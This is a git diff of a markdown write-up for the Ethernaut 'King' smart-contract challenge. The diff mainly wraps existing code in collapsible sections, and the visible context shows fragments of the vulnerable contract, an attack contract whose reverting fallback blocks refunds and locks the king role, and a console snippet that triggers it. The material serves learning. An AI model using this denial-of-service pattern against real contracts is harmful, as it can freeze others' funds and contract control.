@@ -505,6 +505,9 @@ This level is a "King of the Hill" contract. To become the new king, a caller mu
 
 ### 🔓 Vulnerable Code (core idea)
 
+<details>
+<summary><code>contract King {</code></summary>
+
 ```solidity
 contract King {
     address king;
@@ -530,6 +533,8 @@ contract King {
 }
 ```
 
+</details>
+
 ---
 
 ### 🔍 Vulnerability Analysis
@@ -541,6 +546,9 @@ contract King {
 ---
 
 ### 🛡️ Attack Contract
+
+<details>
+<summary><code>// SPDX-License-Identifier: MIT</code></summary>
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -568,6 +576,8 @@ contract KingAttack {
     fallback() external payable { revert("no refunds"); }
 }
 ```
+
+</details>
 
 ---
 
@@ -615,6 +625,9 @@ Relying on push-based refunds with `transfer` during the critical path of state 
 
 ### 🧪 Complete Exploit (JS + Solidity)
 
+<details>
+<summary><code>// KingAttack.sol</code></summary>
+
 ```solidity
 // KingAttack.sol
 pragma solidity ^0.8.0;
@@ -630,12 +643,19 @@ contract KingAttack {
 }
 ```
 
+</details>
+
+<details>
+<summary><code>// Console</code></summary>
+
 ```js
 // Console
 const prize = await contract.prize();
 await kingAttack.attack({ value: prize });
 await contract._king(); // => kingAttack address
 ```
+
+</details>
 
 ---
 
